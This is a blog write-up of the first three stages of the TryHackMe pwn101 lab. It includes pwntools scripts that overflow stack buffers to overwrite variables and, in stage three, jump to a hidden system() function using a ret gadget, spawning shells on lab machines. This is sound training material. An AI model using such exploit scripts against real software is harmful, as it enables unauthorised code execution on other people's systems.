<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.3.2" /><meta property="og:title" content="THM/pwn101 - writeup, part 1" /><meta name="author" content="Farrim Wildaxe" /><meta property="og:locale" content="en" /><meta name="description" content="In this post, we’ll be discussing the TryHackMe room known as pwn101. This challenge will test and improve your buffer overflow and ROP chaining skills. By completing this challenge, you will gain valuable experience in identifying vulnerabilities, exploiting them, and ultimately gaining access to a target system. Whether you’re a newbie or a skilled hacker, pwn101 is an excellent way to sharpen your skills and gain more knowledge in the field of cybersecurity. Let’s explore the specifics of this exciting challenge to discover what it entails." /><meta property="og:description" content="In this post, we’ll be discussing the TryHackMe room known as pwn101. This challenge will test and improve your buffer overflow and ROP chaining skills. By completing this challenge, you will gain valuable experience in identifying vulnerabilities, exploiting them, and ultimately gaining access to a target system. Whether you’re a newbie or a skilled hacker, pwn101 is an excellent way to sharpen your skills and gain more knowledge in the field of cybersecurity. Let’s explore the specifics of this exciting challenge to discover what it entails." /><link rel="canonical" href="https://farrim.re/posts/thm-pwn101/" /><meta property="og:url" content="https://farrim.re/posts/thm-pwn101/" /><meta property="og:site_name" content="Farrim’s blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2023-05-02T16:13:31+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="THM/pwn101 - writeup, part 1" /><meta name="twitter:site" content="@farrimwildaxe" /><meta name="twitter:creator" content="@farrimwildaxe" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Farrim Wildaxe","url":"https://farrim.re"},"dateModified":"2023-05-03T12:20:50+00:00","datePublished":"2023-05-02T16:13:31+00:00","description":"In this post, we’ll be discussing the TryHackMe room known as pwn101. This challenge will test and improve your buffer overflow and ROP chaining skills. By completing this challenge, you will gain valuable experience in identifying vulnerabilities, exploiting them, and ultimately gaining access to a target system. Whether you’re a newbie or a skilled hacker, pwn101 is an excellent way to sharpen your skills and gain more knowledge in the field of cybersecurity. Let’s explore the specifics of this exciting challenge to discover what it entails.","headline":"THM/pwn101 - writeup, part 1","mainEntityOfPage":{"@type":"WebPage","@id":"https://farrim.re/posts/thm-pwn101/"},"url":"https://farrim.re/posts/thm-pwn101/"}</script><title>THM/pwn101 - writeup, part 1 | Farrim's blog</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Farrim's blog"><meta name="application-name" content="Farrim's blog"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="https://farrim.re/assets/farrimwildaxe.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title"> <a href="/">Farrim's blog</a></div><div class="site-subtitle font-italic"></div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a><li class="nav-item"> <a href="/writeups/" class="nav-link"> <i class="fa-fw ml-xl-3 mr-xl-3 unloaded"></i> <span>WRITEUPS</span> </a><li class="nav-item"> <a href="/research/" class="nav-link"> <i class="fa-fw ml-xl-3 mr-xl-3 unloaded"></i> <span>RESEARCH</span> </a><li class="nav-item"> <a href="/disclaimer/" class="nav-link"> <i class="fa-fw ml-xl-3 mr-xl-3 unloaded"></i> <span>DISCLAIMER</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/farrimwildaxe" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/farrimwildaxe" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['FarrimWildaxe','protonmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>THM/pwn101 - writeup, part 1</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>THM/pwn101 - writeup, part 1</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1683044011" data-df="ll" data-toggle="tooltip" data-placement="bottom"> May 2, 2023 </em> </span> <span> Updated <em class="" data-ts="1683116450" data-df="ll" data-toggle="tooltip" data-placement="bottom"> May 3, 2023 </em> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://farrim.re">Farrim Wildaxe</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="824 words"> <em>4 min</em> read</span></div></div></div><div class="post-content"><p>In this post, we’ll be discussing the TryHackMe room known as pwn101. This challenge will test and improve your buffer overflow and ROP chaining skills. By completing this challenge, you will gain valuable experience in identifying vulnerabilities, exploiting them, and ultimately gaining access to a target system. Whether you’re a newbie or a skilled hacker, pwn101 is an excellent way to sharpen your skills and gain more knowledge in the field of cybersecurity. Let’s explore the specifics of this exciting challenge to discover what it entails.</p><h2 id="pwn101pwn101"><span class="mr-2">pwn101.pwn101</span><a href="#pwn101pwn101" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Pwn101 is a series of ten stages that increase in difficulty. However, the first stage, pwn101.pwn101, is relatively easy. As shown in the screenshot below, you only need to provide a long enough string to cause a buffer overflow and modify the integer variable following the buffer:</p><p><a href="/assets/img/thm/pwn101/pwn101-main.png" class="popup img-link "><img data-src="/assets/img/thm/pwn101/pwn101-main.png" alt="pwn101's main() function" class="lazyload" data-proofer-ignore></a></p><p>So, without further ado, here is a pwntools script to accomplish this:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span> 

<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="sh">'</span><span class="s">debug</span><span class="sh">'</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">./pwn101.pwn101</span><span class="sh">"</span><span class="p">)</span>

<span class="n">gs</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
break main
</span><span class="sh">'''</span>
<span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">TMUX</span><span class="p">:</span>
        <span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="sh">"</span><span class="s">tmux</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">splitw</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">-h</span><span class="sh">"</span><span class="p">]</span>

    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="nf">debug</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gs</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">10.10.100.183</span><span class="sh">"</span><span class="p">,</span> <span class="mi">9001</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">process</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">)</span>

<span class="n">io</span> <span class="o">=</span> <span class="nf">start</span><span class="p">()</span>
<span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">make briyani:</span><span class="sh">'</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span> <span class="o">*</span> <span class="mi">70</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
</pre></table></code></div></div><p>We are using multiple “A” letters to create our payload. This payload will modify the value of a variable from <code class="language-plaintext highlighter-rouge">0x00000539</code> (which is equivalent to <code class="language-plaintext highlighter-rouge">1337</code> in decimal) to <code class="language-plaintext highlighter-rouge">0x41414141</code> (represented by the letters “A” in hexadecimal). After running the script, we’ve got the shell:</p><p><a href="/assets/img/thm/pwn101/pwn101-shell.png" class="popup img-link "><img data-src="/assets/img/thm/pwn101/pwn101-shell.png" alt="pwn101 shell" class="lazyload" data-proofer-ignore></a></p><h2 id="pwn102pwn102"><span class="mr-2">pwn102.pwn102</span><a href="#pwn102pwn102" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Our goal in the second challenge is to change the values of two variables located after the buffer. These variables are labelled <code class="language-plaintext highlighter-rouge">variable_1</code> and <code class="language-plaintext highlighter-rouge">variable_2</code> in the screenshot. We need to set them to <code class="language-plaintext highlighter-rouge">0x00c0ff33</code> and <code class="language-plaintext highlighter-rouge">0x0000c0d3</code>to get the shell:</p><p><a href="/assets/img/thm/pwn101/pwn102-main.png" class="popup img-link "><img data-src="/assets/img/thm/pwn101/pwn102-main.png" alt="pwn102's main() function" class="lazyload" data-proofer-ignore></a></p><p>To achieve our goal, we must pass a string of sufficient length that overwrites the buffer and variables with “coffee” and “code” values. Remember to consider endianness:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span> 

<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="sh">'</span><span class="s">debug</span><span class="sh">'</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">./pwn102.pwn102</span><span class="sh">"</span><span class="p">)</span>

<span class="n">gs</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
break main
</span><span class="sh">'''</span>
<span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">TMUX</span><span class="p">:</span>
        <span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="sh">"</span><span class="s">tmux</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">splitw</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">-h</span><span class="sh">"</span><span class="p">]</span>

    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="nf">debug</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gs</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">10.10.100.183</span><span class="sh">"</span><span class="p">,</span> <span class="mi">9002</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">process</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">)</span>

<span class="n">io</span> <span class="o">=</span> <span class="nf">start</span><span class="p">()</span>
<span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">right?</span><span class="sh">'</span><span class="p">)</span>

<span class="n">payload</span>  <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span> <span class="o">*</span> <span class="mi">104</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x0000c0d3</span><span class="p">,</span> <span class="n">endian</span><span class="o">=</span><span class="sh">'</span><span class="s">little</span><span class="sh">'</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x00c0ff33</span><span class="p">,</span> <span class="n">endian</span><span class="o">=</span><span class="sh">'</span><span class="s">little</span><span class="sh">'</span><span class="p">)</span>

<span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
</pre></table></code></div></div><p>Once our payload is ready, we can send it to the server:</p><p><a href="/assets/img/thm/pwn101/pwn102-shell.png" class="popup img-link "><img data-src="/assets/img/thm/pwn101/pwn102-shell.png" alt="pwn102 shell" class="lazyload" data-proofer-ignore></a></p><p>And again, we’ve got a shell.</p><h2 id="pwn103pwn103"><span class="mr-2">pwn103.pwn103</span><a href="#pwn103pwn103" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The third challenge, pwn103, involves a more complex set of tasks to solve than the previous challenges, but it is still relatively easy. After opening the binary file in Ghidra, you can see that it contains a “switch-case” with multiple functions. It looks like a simple chat application:</p><p><a href="/assets/img/thm/pwn101/pwn103-main.png" class="popup img-link "><img data-src="/assets/img/thm/pwn101/pwn103-main.png" alt="pwn103 main() function" class="lazyload" data-proofer-ignore></a></p><p>Let’s check what functionality it has. The <code class="language-plaintext highlighter-rouge">announcements()</code> function prints a few messages and calls <code class="language-plaintext highlighter-rouge">main()</code>, the same as the <code class="language-plaintext highlighter-rouge">discussion()</code> and <code class="language-plaintext highlighter-rouge">rules()</code>. Also, the <code class="language-plaintext highlighter-rouge">bot_cmd()</code> reads the input and displays a few fake commands.</p><p><a href="/assets/img/thm/pwn101/pwn103-general.png" class="popup img-link "><img data-src="/assets/img/thm/pwn101/pwn103-general.png" alt="pwn103 general() function" class="lazyload" data-proofer-ignore></a></p><p>The most interesting for us will be the <code class="language-plaintext highlighter-rouge">general()</code> function which, despite displaying few messages, also reads the input from the user via <code class="language-plaintext highlighter-rouge">scanf()</code> without proper checks. But there is one more thing. After examining the symbol tree thoroughly, we have discovered a function named <code class="language-plaintext highlighter-rouge">admins_only()</code>, which includes a call to the <code class="language-plaintext highlighter-rouge">system()</code>. By exploiting this and the bug in the <code class="language-plaintext highlighter-rouge">general()</code> function, remote code execution is possible.</p><p><a href="/assets/img/thm/pwn101/pwn103-admins_only.png" class="popup img-link "><img data-src="/assets/img/thm/pwn101/pwn103-admins_only.png" alt="pwn103 admins_only() function" class="lazyload" data-proofer-ignore></a></p><p>Let’s write a pwntools script for that:</p><div class="language-jsx highlighter-rouge"><div class="code-header"> <span data-label-text="Jsx"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre><span class="k">from</span> <span class="nx">pwn</span> <span class="k">import</span> <span class="o">*</span> 

<span class="nx">context</span><span class="p">.</span><span class="nx">log_level</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">debug</span><span class="dl">'</span>

<span class="nx">elf</span> <span class="o">=</span> <span class="nx">context</span><span class="p">.</span><span class="nx">binary</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="dl">"</span><span class="s2">./pwn103.pwn103</span><span class="dl">"</span><span class="p">)</span>

<span class="nx">gs</span> <span class="o">=</span> <span class="dl">'''</span><span class="s1">
break main
</span><span class="dl">'''</span>
<span class="nx">def</span> <span class="nf">start</span><span class="p">():</span>
    <span class="k">if</span> <span class="nx">args</span><span class="p">.</span><span class="nx">TMUX</span><span class="p">:</span>
        <span class="nx">context</span><span class="p">.</span><span class="nx">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="dl">"</span><span class="s2">tmux</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">splitw</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">-h</span><span class="dl">"</span><span class="p">]</span>

    <span class="k">if</span> <span class="nx">args</span><span class="p">.</span><span class="nx">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="nx">gdb</span><span class="p">.</span><span class="nf">debug</span><span class="p">(</span><span class="nx">elf</span><span class="p">.</span><span class="nx">path</span><span class="p">,</span> <span class="nx">gdbscript</span><span class="o">=</span><span class="nx">gs</span><span class="p">)</span>
    <span class="nx">elif</span> <span class="nx">args</span><span class="p">.</span><span class="nx">REMOTE</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">remote</span><span class="p">(</span><span class="dl">"</span><span class="s2">10.10.57.182</span><span class="dl">"</span><span class="p">,</span> <span class="mi">9003</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">process</span><span class="p">(</span><span class="nx">elf</span><span class="p">.</span><span class="nx">path</span><span class="p">)</span>

<span class="nx">io</span> <span class="o">=</span> <span class="nf">start</span><span class="p">()</span>
<span class="nx">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="nx">b</span><span class="dl">'</span><span class="s1">channel:</span><span class="dl">'</span><span class="p">)</span>
<span class="nx">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="nx">b</span><span class="dl">'</span><span class="s1">3</span><span class="dl">'</span><span class="p">)</span>
<span class="nx">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="nx">b</span><span class="dl">'</span><span class="s1">pwner]:</span><span class="dl">'</span><span class="p">)</span>

<span class="nx">payload</span>  <span class="o">=</span> <span class="nx">b</span><span class="dl">"</span><span class="s2">A</span><span class="dl">"</span> <span class="o">*</span> <span class="mi">40</span>
<span class="nx">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="nx">elf</span><span class="p">.</span><span class="nx">symbols</span><span class="p">.</span><span class="nx">admins_only</span><span class="p">)</span>

<span class="nx">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="nx">payload</span><span class="p">)</span>
<span class="nx">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
</pre></table></code></div></div><p>We can run the script against the remote machine when it is ready. Let’s run it.</p><p><a href="/assets/img/thm/pwn101/pwn103-shell.png" class="popup img-link "><img data-src="/assets/img/thm/pwn101/pwn103-shell.png" alt="pwn103 shell" class="lazyload" data-proofer-ignore></a></p><p>The script started but crashed after sending a command to the spawned shell. After looking in GDB, we see that our stack needs to be aligned. So we need to pop one item from the stack. The easiest way is to find a <code class="language-plaintext highlighter-rouge">ret</code> gadget and use it. We can use the <code class="language-plaintext highlighter-rouge">ROPgadget</code> tool for that:</p><p><a href="/assets/img/thm/pwn101/pwn103-ropgadget.png" class="popup img-link "><img data-src="/assets/img/thm/pwn101/pwn103-ropgadget.png" alt="pwn103 ROPgadget tool" class="lazyload" data-proofer-ignore></a></p><p>It found the “ret” instruction at the <code class="language-plaintext highlighter-rouge">0x00401016</code> address. Let’s use it:</p><div class="language-jsx highlighter-rouge"><div class="code-header"> <span data-label-text="Jsx"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nx">payload</span>  <span class="o">=</span> <span class="nx">b</span><span class="dl">"</span><span class="s2">A</span><span class="dl">"</span> <span class="o">*</span> <span class="mi">40</span>
<span class="nx">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x00401016</span><span class="p">)</span>              <span class="err">#</span> <span class="nx">ret</span><span class="p">,</span> <span class="nx">to</span> <span class="nx">make</span> <span class="nx">stack</span> <span class="nx">properly</span> <span class="nx">aligned</span>
<span class="nx">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="nx">elf</span><span class="p">.</span><span class="nx">symbols</span><span class="p">.</span><span class="nx">admins_only</span><span class="p">)</span>
</pre></table></code></div></div><p>And here is the result, we’ve got the shell again.</p><p><a href="/assets/img/thm/pwn101/pwn103-shell2.png" class="popup img-link "><img data-src="/assets/img/thm/pwn101/pwn103-shell2.png" alt="pwn103 shell v2" class="lazyload" data-proofer-ignore></a></p><p>Great job, we’ve successfully finished this section! Join me in the next part, where we’ll tackle the rest of the challenges from this room together.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/writeup/'>Writeup</a>, <a href='/categories/thm/'>THM</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/thm/" class="post-tag no-text-decoration" >thm</a> <a href="/tags/pwn101/" class="post-tag no-text-decoration" >pwn101</a> <a href="/tags/writeup/" class="post-tag no-text-decoration" >writeup</a> <a href="/tags/pwntools/" class="post-tag no-text-decoration" >pwntools</a> <a href="/tags/buffer-overflow/" class="post-tag no-text-decoration" >buffer overflow</a> <a href="/tags/rop/" class="post-tag no-text-decoration" >rop</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=THM/pwn101%20-%20writeup,%20part%201%20-%20Farrim's%20blog&url=https%3A%2F%2Ffarrim.re%2Fposts%2Fthm-pwn101%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/thm-pwn101/">THM/pwn101 - writeup, part 1</a><li><a href="/posts/htb-retired/">HTB/Retired - writeup</a><li><a href="/posts/rop-emporium-ret2win/">ROP Emporium - ret2win (x64) - writeup</a><li><a href="/posts/testing-testing/">Testing testing...</a><li><a href="/posts/htb-blue-writeup/">HTB Blue - writeup</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/pwntools/">pwntools</a> <a class="post-tag" href="/tags/rop/">rop</a> <a class="post-tag" href="/tags/emporium/">emporium</a> <a class="post-tag" href="/tags/x64/">x64</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/blue/">blue</a> <a class="post-tag" href="/tags/buffer-overflow/">buffer overflow</a> <a class="post-tag" href="/tags/callme/">callme</a> <a class="post-tag" href="/tags/eternal-blue/">eternal_blue</a></div></div></div><script 